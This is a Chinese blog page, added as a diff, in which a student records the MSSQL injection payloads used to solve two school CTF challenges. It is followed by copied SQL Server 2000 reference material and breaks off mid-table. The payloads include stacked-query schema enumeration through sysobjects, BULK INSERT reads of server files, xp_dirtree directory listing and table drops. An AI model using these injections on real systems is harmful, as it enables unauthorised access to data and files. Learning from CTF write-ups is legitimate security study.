@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="mssql,sqlserver2000,注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！ ——————————————————————————————————————&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注入">
+<meta name="keywords" content="mssql,sqlserver2000,注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于mssql注入的两个题目">
+<meta property="og:url" content="http://yoursite.com/2011/10/11/关于mssql注入的两个题目/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！ ——————————————————————————————————————&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注入">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.264Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于mssql注入的两个题目">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！ ——————————————————————————————————————&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注入">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2011/10/11/关于mssql注入的两个题目/"/>
+
+
+
+
+
+  <title>关于mssql注入的两个题目 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/11/关于mssql注入的两个题目/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">关于mssql注入的两个题目</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-11T16:42:44+08:00">
+                2011-10-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQLServer/" itemprop="url" rel="index">
+                    <span itemprop="name">SQLServer</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:16px;">我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！</span></p>
+<p><span style="font-size:16px;">——————————————————————————————————————</span><span style="font-size:16px;">&nbsp;&nbsp;&nbsp;&nbsp; </span></p>
+<p><span style="font-size:16px;">&nbsp;&nbsp;&nbsp;&nbsp; 注入的框架是insert into web values(</span><span style="font-size:16px;">’a’</span><span style="font-size:16px;">,’b</span><span style="font-size:16px;">’</span><span style="font-size:16px;">);&nbsp; 在b的位置我们可以通过表单输入字符串并且输入的字符串可以显示在下面的网站中，相当于就是一个留言册</span><span style="font-size:16px;">，a的位置是被固定的自加</span><span style="font-size:16px;">id。</span></p>
+<p><span style="font-size:16px;">题目中没有给任何提示！</span></p>
+<p><span style="font-size:16px;">—————————————-</span></p>
+<p><span style="font-size:16px;">下面把做题中的语句记录下来，留作以后用：</span></p>
+<p><span style="font-size:16px;">’);select text from web</span></p>
+<p><span style="font-size:16px;">’);select&nbsp;id</span><span style="font-size:16px;"> from web</span></p>
+<p><span style="font-size:16px;">’);insert into </span><span style="font-size:16px;">web(text) select DB_NAME(1);–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select name from Web400_Key</span><span style="font-size:16px;">.dbo.sysobjects where xtype=’U’;–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select&nbsp;id</span><span style="font-size:16px;"> from Web400_Key.dbo.sysobjects where xtype=’U’;–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select name from </span><span style="font-size:16px;">Web400_Key</span><span style="font-size:16px;">.dbo.syscolumns where id=xxxxxxx</span><span style="font-size:16px;">;–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select </span><span style="font-size:16px;">ok from Web400_Key.dbo.key1;–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select substring((ok),25,30) from Web400_Key.dbo.key1;–</span></p>
+<p><span style="font-size:16px;">———————————-</span></p>
+<p><span style="font-size:16px;">’)drop table Geek_Temp.Geek_Web45.ln_test;create table Geek_Temp.Geek_Web45.ln_test(ln VARCHAR(100));–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Temp.Geek_Web45.ln_test values(’lnlnln’);–</span></p>
+<p><span style="font-size:16px;">’);bulk insert Geek_Temp.Geek_Web45.ln_test from ’C:W3B500_KeyW3B500_Keykey2.asp’ with (FIELDTERMINATOR=’,’,ROWTERMINATOR=’<br>’);–</span></p>
+<p><span style="font-size:16px;">’);insert into Geek_Web45_DB.dbo.web(text) select ln from Geek_Temp.Geek_Web45.ln_test;–</span></p>
+<p><span style="font-size:16px;">’);drop table Geek_Temp.dbo.ln1_test_table;create table Geek_Temp.dbo.ln1_test_table(mulu VARCHAR(100),lujing VARCHAR(100),[file] VARCHAR(100)) Insert Geek_Temp.dbo.ln1_test_table exec master..xp_dirtree”c:</span><span style="font-size:16px;">“,1,1;–</span></p>
+<hr>
+<p>**select APP_NAME ( ) –当前会话的应用程序</p>
+<p>select @@ERROR&nbsp;&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码(integer)</p>
+<p>select @@IDENTITY&nbsp;&nbsp;&nbsp; –返回最后插入的标识值</p>
+<p>Select USER_NAME()&nbsp;&nbsp;&nbsp;&nbsp; –返回用户数据库用户名</p>
+<p>select @@ERROR&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码</p>
+<p>Select @@CONNECTIONS&nbsp;&nbsp; –返回自上次SQL启动以来连接或试图连接的次数。</p>
+<p>Select GETDATE() –当前时间</p>
+<p>Select @@CPU_BUSY/100&nbsp;&nbsp; –返回自上次启动SQL 以来 CPU 的工作时间，单位为毫秒</p>
+<p>USE tempdb Select @@DBTS&nbsp;&nbsp; –为当前数据库返回当前 timestamp 数据类型的值。这一 timestamp 值保证在数据库中是唯一的。</p>
+<p>select @@IDENTITY –返回最后插入的标识值</p>
+<p>Select @@IDLE&nbsp;&nbsp; –返回SQL自上次启动后闲置的时间，单位为毫秒</p>
+<p>Select @@IO_BUSY&nbsp;&nbsp;&nbsp; –返回SQL自上次启动后用于执行输入和输出操作的时间，单位为毫秒</p>
+<p>Select @@LANGID&nbsp;&nbsp;&nbsp; –返回当前所使用语言的本地语言标识符(ID)。</p>
+<p>Select @@LANGUAGE&nbsp;&nbsp;&nbsp; –返回当前使用的语言名</p>
+<p>Select @@LOCK_TIMEOUT&nbsp;&nbsp; –当前会话的当前锁超时设置，单位为毫秒。</p>
+<p>Select @@MAX_CONNECTIONS&nbsp;&nbsp; –返回SQL上允许的同时用户连接的最大数。返回的数不必为当前配置的数值</p>
+<p>EXEC sp_configure&nbsp;&nbsp; –显示当前服务器的全局配置设置</p>
+<p>Select @@MAX_PRECISION –返回 decimal 和 numeric 数据类型所用的精度级别，即该服务器中当前设置的精度。默认最大精度38。</p>
+<p>select @@OPTIONS&nbsp;&nbsp; –返回当前 SET 选项的信息。</p>
+<p>Select @@PACK_RECEIVED&nbsp;&nbsp; –返回SQL自启动后从网络上读取的输入数据包数目。</p>
+<p>Select @@PACK_SENT&nbsp;&nbsp; –返回SQ自上次启动后写到网络上的输出数据包数目。</p>
+<p>Select @@PACKET_ERRORS&nbsp;&nbsp; –返回自SQL启动后，在SQL连接上发生的网络数据包错误数。</p>
+<p>Select @@SERVERNAME –返回运行SQL服务器名称。</p>
+<p>Select @@SERVICENAME –返回SQL正在其下运行的注册表键名</p>
+<p>Select @@TIMETICKS –返回SQL服务器一刻度的微秒数</p>
+<p>Select @@TOTAL_ERRORS&nbsp;&nbsp; –返回 SQL服务器自启动后，所遇到的磁盘读/写错误数。</p>
+<p>Select @@TOTAL_READ&nbsp;&nbsp; –返回 SQL服务器自启动后读取磁盘的次数。</p>
+<p>Select @@TOTAL_WRITE&nbsp;&nbsp; –返回SQL服务器自启动后写入磁盘的次数。</p>
+<p>Select @@TRANCOUNT&nbsp;&nbsp; –返回当前连接的活动事务数。</p>
+<p>Select @@VERSION&nbsp;&nbsp; –返回SQL服务器安装的日期、版本和处理器类型。** </p>
+<hr>
+<p>&nbsp;</p>
+<h2 id="SQL2000系统表、存储过程、函数的功能介绍及应用"><a href="#SQL2000系统表、存储过程、函数的功能介绍及应用" class="headerlink" title="SQL2000系统表、存储过程、函数的功能介绍及应用 "></a><a href="http://www.cnblogs.com/Spring/archive/2008/05/28/1209092.html" target="_blank" rel="noopener"><span style="color:#0066aa;">SQL2000系统表、存储过程、函数的功能介绍及应用 </span></a></h2><div class="postText"><br><div id="cnblogs_post_body"><br><br><span lang="EN-US">&lt;?XML:NAMESPACE PREFIX = O /&gt;&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统表</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">————————————————————————————–</span></span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">虽然使用系统存储过程、系统函数与信息架构视图已经可以为我们提供了相当丰富的元数据信息，但是对于某些特殊的元数据信息，我们仍然需要直接对系统表进行查询。因为</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">将所有数据库对象的信息均存放在系统表中，作为</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的管理、开发人员，了解各个系统表的作用将有助于我们了解</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的内在工作原理。</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的系统表非常多，其中最常用的与元数据查询有关的表有如下一些：</span></span><br><br>&nbsp;<br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">系统表</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">syscolumns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储每个表和视图中的每一列的信息以及存储过程中的每个参数的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">syscomments</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储包含每个视图、规则、默认值、触发器、</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">CHECK </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束、</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">DEFAULT </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束和存储过程的原始</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">文本语句。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysconstraints</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前数据库中每一个约束的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysdatabases</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前服务器上每一个数据库的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysindexes</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前数据库中的每个索引的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysobjects</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储数据库内的每个对象（约束、默认值、日志、规则、存储过程等）的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysreferences</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储所有包括</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> FOREIGN KEY </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束的列。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">systypes</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储系统提供的每种数据类型和用户定义数据类型的详细信息。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">将系统存储过程、系统函数、信息架构视图与系统表结合使用，可以方便地让我们获得所有需要的元数据信息。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">示例：</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">1</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">、</span><span style="font-family:’Times New Roman’;"> </span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获得当前数据库所有用户表的名称。</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT OBJECT_NAME (id)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FROM sysobjects</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE xtype = ’U’ AND OBJECTPROPERTY (id, ’IsMSShipped’) = 0</span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">其中主要用到了系统表</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> sysobjects</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">以及其属性</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> xtype</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">，还有就是用到了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> OBJECTPROPERTY </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统函数来判断是不是安装</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的过程中创建的对象。</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">2</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">、</span><span style="font-family:’Times New Roman’;"> </span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获得指定表上所有的索引名称</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT name FROM sysindexes</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE id = OBJECT_ID (’mytable’) AND indid &gt; 0</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统存储过程</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————</span></span></span><br><br><span lang="EN-US">&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">系统存储过程</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_columns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定表或视图的列的详细信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_databases</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New 